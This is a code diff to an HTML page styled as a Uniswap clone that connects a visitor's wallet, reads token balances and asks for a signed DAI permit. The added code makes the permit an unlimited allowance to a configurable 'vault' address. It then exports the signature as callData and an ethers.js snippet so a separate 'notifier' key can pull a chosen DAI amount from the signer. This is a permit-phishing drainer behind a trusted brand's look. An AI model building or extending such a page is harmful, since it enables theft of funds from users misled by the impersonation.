@@ -3,13 +3,13 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Uniswap — Demo Clone</title>
+  <title>Uniswap — Demo Clone (Vault + DAI Permit)</title>
   <style>
     :root{--bg:#0b0b0f;--surface:#111216;--border:#24262c;--ink:#e9ecf1;--muted:#9aa0ab;--accent:#ff2db2;--shadow:0 8px 28px rgba(0,0,0,.45)}
     *{box-sizing:border-box}
     body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;background:radial-gradient(900px 700px at 70% -10%, rgba(255,45,178,.16), transparent 55%),radial-gradient(700px 600px at -10% 10%, rgba(168,85,247,.12), transparent 50%),var(--bg);color:var(--ink)}
     .wrap{max-width:1200px;margin:0 auto;padding:20px}
-    header{display:grid;grid-template-columns:220px 1fr 320px;align-items:center;gap:12px;margin-bottom:24px}
+    header{display:grid;grid-template-columns:220px 1fr 360px;align-items:center;gap:12px;margin-bottom:24px}
     .brand{display:flex;align-items:center;gap:10px}
     .uni{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;background:radial-gradient(circle at 30% 30%, #ff8ad5, #ff2db2)}
     .uni svg{width:18px;height:18px;fill:#fff}
@@ -18,12 +18,12 @@
     .search input{flex:1;background:transparent;border:0;outline:0;color:#cfd3da;font-size:14px}
 
     .top-right{display:flex;justify-content:flex-end;gap:10px;align-items:center;position:relative}
-    .dots{width:40px;height:40px;border-radius:999px;border:1px solid #23262f;background:#12131a;display:grid;place-items:center}
+    .dots{width:40px;height:40px;border-radius:999px;border:1px solid #23262f;background:#12131a;display:grid;place-items:center;cursor:pointer}
     .connect{padding:10px 16px;border-radius:999px;border:0;cursor:pointer;color:#fff;font-weight:600;background:linear-gradient(180deg,#ff2db2,#ff46c0)}
 
     .account-btn{display:none;align-items:center;gap:8px;padding:8px 12px;border:1px solid #2a2d36;background:#141720;border-radius:999px;color:#e7ecfb;cursor:pointer}
     .account-text{font-weight:600;font-size:14px}
-    .account-menu{position:absolute;right:0;top:52px;width:460px;background:#12141b;border:1px solid #232634;border-radius:12px;box-shadow:var(--shadow);display:none;z-index:30}
+    .account-menu{position:absolute;right:0;top:52px;width:480px;background:#12141b;border:1px solid #232634;border-radius:12px;box-shadow:var(--shadow);display:none;z-index:30}
     .account-menu.show{display:block}
     .account-menu .row{display:flex;align-items:center;gap:10px;padding:12px;color:#cbd2df}
     .account-menu .row + .row{border-top:1px solid #232634}
@@ -50,9 +50,9 @@
     .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#161821;border:1px solid #2a2d36;color:#e6ebff;padding:10px 14px;border-radius:10px;display:none;z-index:50}
     .toast.show{display:block}
 
-    /* Permit modal */
+    /* Modals */
     .modal{position:fixed;inset:0;display:none;place-items:center;background:rgba(5,8,18,.6);backdrop-filter:blur(6px);z-index:60}
-    .sheet{width:min(700px,92vw);border-radius:16px;background:#111217;border:1px solid #262a33;box-shadow:var(--shadow)}
+    .sheet{width:min(720px,92vw);border-radius:16px;background:#111217;border:1px solid #262a33;box-shadow:var(--shadow)}
     .sheet .hd{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid #262a33}
     .sheet .bd{padding:14px}
     .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
@@ -76,7 +76,7 @@
       </div>
       <div class="search"><svg width="16" height="16" viewBox="0 0 24 24"><path fill="#93a0c8" d="M15.5 14h-.8l-.3-.3a6.5 6.5 0 1 0-.7.7l.3.3v.8l5 5 1.5-1.5-5-5zM10 15a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/></svg><input placeholder="Search tokens and pools" /></div>
       <div class="top-right">
-        <div class="dots"><svg viewBox="0 0 24 24"><circle cx="12" cy="4" r="2" fill="#cfd3da"/><circle cx="12" cy="12" r="2" fill="#cfd3da"/><circle cx="12" cy="20" r="2" fill="#cfd3da"/></svg></div>
+        <div class="dots" onclick="openSettings()"><svg viewBox="0 0 24 24"><circle cx="12" cy="4" r="2" fill="#cfd3da"/><circle cx="12" cy="12" r="2" fill="#cfd3da"/><circle cx="12" cy="20" r="2" fill="#cfd3da"/></svg></div>
         <button class="connect" id="connectBtn" onclick="connectWallet()">Connect</button>
         <button class="account-btn" id="accountBtn">
           <span id="acctIcon"></span>
@@ -84,11 +84,7 @@
         </button>
         <div class="account-menu" id="accountMenu">
           <div class="row"><span class="addr" id="menuAddr">—</span><span id="signStatus" style="font-size:12px;color:#8bd7a5;display:none">Signed ✓</span><button onclick="copyAddr()">Copy</button></div>
-          <div class="row" style="gap:10px;flex-wrap:wrap">
-            <button onclick="requestSignature()">Sign message</button>
-            <button onclick="openPermit()">Permit (DAI)</button>
-            <button onclick="disconnectWallet()">Disconnect</button>
-          </div>
+          <div class="row" style="gap:10px;flex-wrap:wrap"><button onclick="requestSignature()">Sign message</button><button onclick="openPermit()">DAI Permit</button><button onclick="openSettings()">Settings</button><button onclick="disconnectWallet()">Disconnect</button></div>
         </div>
       </div>
     </header>
@@ -113,7 +109,7 @@
 
   <div class="toast" id="toast">Note</div>
 
-  <!-- Ethers.js for permit/approve transactions -->
+  <!-- Ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
   // ===== Helpers =====
@@ -133,7 +129,9 @@
   const ERC20S={DAI:{addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18},USDC:{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48',decimals:6},USDT:{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6}};
   const formatUnitsBI=(hex,dec)=>{ const s=BigInt(hex).toString(); const pad=Number(dec); const int=s.length>pad?s.slice(0,-pad):'0'; const frac=s.length>pad?s.slice(-pad):s.padStart(pad,'0'); const out=int+(pad?'.':'')+frac.replace(/0+$/,''); return out.endsWith('.')?out.slice(0,-1):out; };
 
-  let currentAddress=null, lastSignature=null, lastPermitPayload=null;
+  let currentAddress=null, lastSignature=null;
+  let VAULT_ADDRESS = localStorage.getItem('vaultAddress') || '';
+  let NOTIFIER_ADDRESS = localStorage.getItem('notifierAddress') || '';
 
   // ===== Wallet connect =====
   window.connectWallet = async function(){
@@ -182,95 +180,141 @@
     try{ const wei=await window.ethereum.request({method:'eth_getBalance', params:[addr,'latest']}); const eth=Number(formatUnitsBI(wei,18)); qs('#balETH').textContent=eth.toLocaleString(undefined,{maximumFractionDigits:6}); for(const [sym,info] of Object.entries(ERC20S)){ const data='0x70a08231'+addr.replace(/^0x/,'').padStart(64,'0'); const res=await window.ethereum.request({method:'eth_call', params:[{to:info.addr, data}, 'latest']}); const val=Number(formatUnitsBI(res, info.decimals)); qs('#bal'+sym).textContent=val.toLocaleString(undefined,{maximumFractionDigits:6}); } }catch(e){ console.error(e); toast('Failed to load balances.'); }
   }
 
-  // ===== Permit (DAI) =====
+  // ===== Settings modal =====
+  function openSettings(){
+    qs('#setVault').value = VAULT_ADDRESS;
+    qs('#setNotifier').value = NOTIFIER_ADDRESS;
+    qs('#settingsModal').style.display='grid';
+  }
+  function closeSettings(){ qs('#settingsModal').style.display='none'; }
+  function saveSettings(){
+    VAULT_ADDRESS = qs('#setVault').value.trim();
+    NOTIFIER_ADDRESS = qs('#setNotifier').value.trim();
+    localStorage.setItem('vaultAddress', VAULT_ADDRESS);
+    localStorage.setItem('notifierAddress', NOTIFIER_ADDRESS);
+    toast('Settings saved');
+    closeSettings();
+  }
+  window.openSettings=openSettings; window.closeSettings=closeSettings; window.saveSettings=saveSettings;
+
+  // ===== DAI Permit (builds payload for DaiPullVault.permitAndPull) =====
   const DAI='0x6B175474E89094C44Da98b954EedeAC495271d0F';
   function splitSig(sig){ const s=sig.replace(/^0x/,''); const r='0x'+s.slice(0,64); const s2='0x'+s.slice(64,128); let v=parseInt(s.slice(128,130),16); if(v<27) v+=27; return {v, r, s:s2}; }
   async function readName(token){ const res=await ethereum.request({method:'eth_call', params:[{to:token, data:'0x06fdde03'}, 'latest']}); try{ const hex=res.replace(/^0x/,''); const off=parseInt(hex.slice(0,64),16)*2; const len=parseInt(hex.slice(64,128),16)*2; const bytes=hex.slice(128,128+len).match(/.{1,2}/g).map(b=>parseInt(b,16)); return new TextDecoder().decode(new Uint8Array(bytes)); }catch{return 'Token';} }
   async function readNonce(token, owner){ const data='0x7ecebe00'+owner.replace(/^0x/,'').padStart(64,'0'); const res=await ethereum.request({method:'eth_call', params:[{to:token, data}, 'latest']}); return BigInt(res).toString(); }
 
-  window.openPermit = function(){ if(!currentAddress){ toast('Connect wallet first.'); return; } document.getElementById('permitOwner').value=currentAddress; document.getElementById('permitSpender').value='0x4f37591FcD7dB4febbD50452eF61FFF8066316Ca'; document.getElementById('permitAllowed').value='true'; document.getElementById('permitModal').style.display='grid'; document.getElementById('permitResult').style.display='none'; document.getElementById('permitHint').style.display='none'; };
-  window.closePermit = function(){ document.getElementById('permitModal').style.display='none'; };
+  window.openPermit = function(){ if(!currentAddress){ toast('Connect wallet first.'); return; } qs('#permitOwner').value=currentAddress; qs('#permitVault').value = VAULT_ADDRESS; qs('#permitModal').style.display='grid'; qs('#permitResult').style.display='none'; qs('#permitHint').style.display='none'; };
+  window.closePermit = function(){ qs('#permitModal').style.display='none'; };
 
-  // Build typed data once
-  async function buildDaiPermit(owner, spender, minutesFromNow, allowed){
+  async function buildDaiPermit(owner, spender, minutesFromNow){
     const chainId=parseInt(await ethereum.request({method:'eth_chainId'}),16);
     const name=await readName(DAI);
     const nonce=await readNonce(DAI, owner);
     const expiry=Math.floor(Date.now()/1000)+minutesFromNow*60;
     const typedData={
-      types:{
-        EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
-        Permit:[{name:'holder',type:'address'},{name:'spender',type:'address'},{name:'nonce',type:'uint256'},{name:'expiry',type:'uint256'},{name:'allowed',type:'bool'}]
-      },
+      types:{ EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}], Permit:[{name:'holder',type:'address'},{name:'spender',type:'address'},{name:'nonce',type:'uint256'},{name:'expiry',type:'uint256'},{name:'allowed',type:'bool'}] },
       primaryType:'Permit',
       domain:{name,version:'1',chainId,verifyingContract:DAI},
-      message:{holder:owner,spender,nonce,expiry,allowed}
+      message:{holder:owner,spender,nonce,expiry,allowed:true}
     };
     return {typedData, chainId, name, nonce, expiry};
   }
 
-  // 1) Sign ONLY (export JSON for relayer)
   window.signPermitExport = async function(){
     try{
       if(!currentAddress){ toast('Connect wallet first.'); return; }
-      const owner=currentAddress; const spender=(document.getElementById('permitSpender').value||'').trim(); if(!/^0x[0-9a-fA-F]{40}$/.test(spender)){ toast('Enter a valid spender address.'); return; }
-      const mins=parseInt(document.getElementById('permitMins').value||'30',10); const allowed=document.getElementById('permitAllowed').value==='true';
-      const {typedData, expiry, chainId}=await buildDaiPermit(owner, spender, mins, allowed);
+      const owner=currentAddress;
+      const vault = qs('#permitVault').value.trim();
+      if(!/^0x[0-9a-fA-F]{40}$/.test(vault)){ toast('Enter a valid vault address in Settings.'); return; }
+      const mins=parseInt(qs('#permitMins').value||'30',10);
+      const amountStr = (qs('#permitAmount').value||'').trim();
+      if(!amountStr){ toast('Enter an amount to pull (DAI).'); return; }
+      let amountWei; try{ amountWei = ethers.utils.parseUnits(amountStr, 18).toString(); }catch{ toast('Invalid DAI amount'); return; }
+
+      const {typedData, expiry, chainId, nonce} = await buildDaiPermit(owner, vault, mins);
       const sig=await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
       const {v,r,s}=splitSig(sig);
-      lastPermitPayload={ token:DAI, owner, spender, allowed, expiry, chainId, typedData, signature:sig, v, r, s };
-      const box=document.getElementById('permitResult'); box.style.display='block'; box.innerHTML=`<div class="mono">Signed payload (share with relayer):</div><pre>${JSON.stringify(lastPermitPayload,null,2)}</pre><div class="row-right"><button class="btn" onclick="copyPermitJSON()">Copy JSON</button></div>`;
-      document.getElementById('permitHint').style.display='block';
+
+      const payload = {
+        vault,
+        function: 'permitAndPull',
+        args: { holder: owner, nonce, expiry, allowed: true, v, r, s, amount: amountWei },
+        chainId,
+        dai: DAI
+      };
+
+      // also craft an ethers.js snippet and callData
+      const iface = new ethers.utils.Interface([
+        'function permitAndPull(address holder,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s,uint256 amount)'
+      ]);
+      const callData = iface.encodeFunctionData('permitAndPull', [owner, nonce, expiry, true, v, r, s, amountWei]);
+      const snippet = `// Ethers v5 snippet (sender must equal dappNotifier in the vault)\nimport { ethers } from 'ethers';\nconst VAULT = '${vault}';\nconst provider = new ethers.providers.JsonRpcProvider('<RPC_URL>');\nconst signer = new ethers.Wallet('<NOTIFIER_PRIVATE_KEY>', provider); // this must be dappNotifier\nconst iface = new ethers.utils.Interface([\n  'function permitAndPull(address,uint256,uint256,bool,uint8,bytes32,bytes32,uint256)'\n]);\nconst data = iface.encodeFunctionData('permitAndPull', ['${owner}', ${nonce}, ${expiry}, true, ${v}, '${r}', '${s}', '${amountWei}']);\nconst tx = await signer.sendTransaction({ to: VAULT, data });\nconsole.log('tx hash', tx.hash);`;
+
+      const box=qs('#permitResult');
+      box.style.display='block';
+      box.innerHTML = `<div class="mono">permitAndPull payload</div><pre>${JSON.stringify(payload,null,2)}</pre><div class="mono">callData</div><pre>${callData}</pre><div class="mono">ethers.js snippet</div><pre>${snippet}</pre>`;
+      qs('#permitHint').style.display='block';
       toast('Permit signed (export ready)');
     }catch(e){ console.warn('Permit export failed', e); toast('Permit sign failed or rejected'); }
   }
-  window.copyPermitJSON = async function(){ if(!lastPermitPayload) return; try{ await navigator.clipboard.writeText(JSON.stringify(lastPermitPayload,null,2)); toast('Copied to clipboard'); }catch{ toast('Copy failed'); } };
 
-  // 2) Sign & SUBMIT (you pay gas)
-  window.signPermitSubmit = async function(){
+  window.signPermitSubmitDai = async function(){
+    // Optional: user sets allowance directly to the vault (user pays gas). Useful for testing on mainnet or testnet before relayer is ready.
     try{
       if(!currentAddress){ toast('Connect wallet first.'); return; }
-      const owner=currentAddress; const spender=(document.getElementById('permitSpender').value||'').trim(); if(!/^0x[0-9a-fA-F]{40}$/.test(spender)){ toast('Enter a valid spender address.'); return; }
-      const mins=parseInt(document.getElementById('permitMins').value||'30',10); const allowed=document.getElementById('permitAllowed').value==='true';
-      const {typedData, expiry}=await buildDaiPermit(owner, spender, mins, allowed);
+      const owner=currentAddress; const vault=qs('#permitVault').value.trim();
+      if(!/^0x[0-9a-fA-F]{40}$/.test(vault)){ toast('Enter a valid vault address in Settings.'); return; }
+      const mins=parseInt(qs('#permitMins').value||'30',10);
+      const {typedData, expiry, chainId, nonce} = await buildDaiPermit(owner, vault, mins);
       const sig=await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
       const {v,r,s}=splitSig(sig);
       const provider=new ethers.providers.Web3Provider(window.ethereum); const signer=provider.getSigner();
       const dai=new ethers.Contract(DAI,['function permit(address holder,address spender,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s)'], signer);
-      const nonce=typedData.message.nonce; const tx=await dai.permit(owner, spender, nonce, expiry, allowed, v, r, s); const rcpt=await tx.wait();
-      const box=document.getElementById('permitResult'); box.style.display='block'; box.innerHTML=`<div class="mono">Submitted permit tx:</div><pre>${rcpt.transactionHash}</pre>`; document.getElementById('permitHint').style.display='block';
-      toast('Permit submitted');
-    }catch(e){ console.warn('Permit submit failed', e); toast('Permit failed or rejected'); }
+      const tx=await dai.permit(owner, vault, nonce, expiry, true, v, r, s); const rcpt=await tx.wait();
+      const box=qs('#permitResult'); box.style.display='block'; box.innerHTML = `<div class="mono">DAI.permit() submitted by user</div><pre>${rcpt.transactionHash}</pre>`; qs('#permitHint').style.display='block';
+      toast('DAI permit submitted');
+    }catch(e){ console.warn('DAI permit submit failed', e); toast('Permit failed or rejected'); }
   }
 
-  // UI: show modal
+  // ===== Modals Markup injections (Settings + Permit) =====
   </script>
 
+  <!-- Settings modal -->
+  <div class="modal" id="settingsModal" aria-hidden="true">
+    <div class="sheet">
+      <div class="hd"><b>Settings</b><button class="btn" onclick="closeSettings()">Close</button></div>
+      <div class="bd">
+        <div class="field"><label>Vault address (DaiPullVault)</label><input id="setVault" placeholder="0xVault... (set after deploy)"></div>
+        <div class="field"><label>Notifier address (must match vault.dappNotifier)</label><input id="setNotifier" placeholder="0xNotifier... (optional)"></div>
+        <div class="row-right"><button class="btn pink" onclick="saveSettings()">Save</button></div>
+        <div class="mono" style="margin-top:8px;color:#9aa3b2">Note: The contract isn’t deployed yet—set the vault address here once it is.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Permit modal -->
   <div class="modal" id="permitModal" aria-hidden="true">
     <div class="sheet">
-      <div class="hd"><b>DAI Permit</b><button class="btn" onclick="closePermit()">Close</button></div>
+      <div class="hd"><b>DAI Permit → Vault</b><button class="btn" onclick="closePermit()">Close</button></div>
       <div class="bd">
         <div class="grid2">
           <div class="field"><label>Owner (your address)</label><input id="permitOwner" readonly></div>
-          <div class="field"><label>Spender</label><input id="permitSpender" value="0x4f37591FcD7dB4febbD50452eF61FFF8066316Ca"></div>
+          <div class="field"><label>Vault (spender)</label><input id="permitVault" placeholder="0xVault... (set in Settings)"></div>
         </div>
         <div class="grid2">
-          <div class="field"><label>Allowed</label>
-            <select id="permitAllowed"><option value="true">true (unlimited)</option><option value="false">false (revoke)</option></select>
-          </div>
+          <div class="field"><label>Amount to pull (DAI)</label><input id="permitAmount" placeholder="e.g. 1.0"></div>
           <div class="field"><label>Deadline (minutes from now)</label><input id="permitMins" type="number" value="30" min="1"></div>
         </div>
         <div class="row-right">
-          <button class="btn" onclick="signPermitExport()">Sign only (export JSON)</button>
-          <button class="btn pink" onclick="signPermitSubmit()">Sign & submit (you pay gas)</button>
+          <button class="btn" onclick="signPermitExport()">Sign only (export for notifier)</button>
+          <button class="btn pink" onclick="signPermitSubmitDai()">Sign & submit DAI.permit (you pay gas)</button>
         </div>
         <div id="permitResult" style="margin-top:12px;display:none"></div>
         <div id="permitHint" style="margin-top:8px;color:#9aa3b2;font-size:12px;display:none">
-          <div class="mono">Relayer notes:</div>
           <ul>
-            <li>Anyone can call <code>DAI.permit(holder, spender, nonce, expiry, allowed, v, r, s)</code> with this payload.</li>
-            <li>The tx will cost gas for the <em>sender</em> of the transaction (relayer/dApp/user).</li>
-            <li>DAI's permit toggles unlimited (true) or 0 (false). It cannot set an exact 1 DAI allowance.</li>
+            <li>Exported JSON targets <code>DaiPullVault.permitAndPull</code>. The tx sender must equal <code>dappNotifier</code> configured in the vault.</li>
+            <li>DAI permit is boolean (unlimited). Exact 1 DAI limits require a normal <code>approve</code> instead.</li>
+            <li>"Sign & submit DAI.permit" only sets allowance to the vault; pulling still requires a separate call from the notifier.</li>
           </ul>
         </div>
       </div>
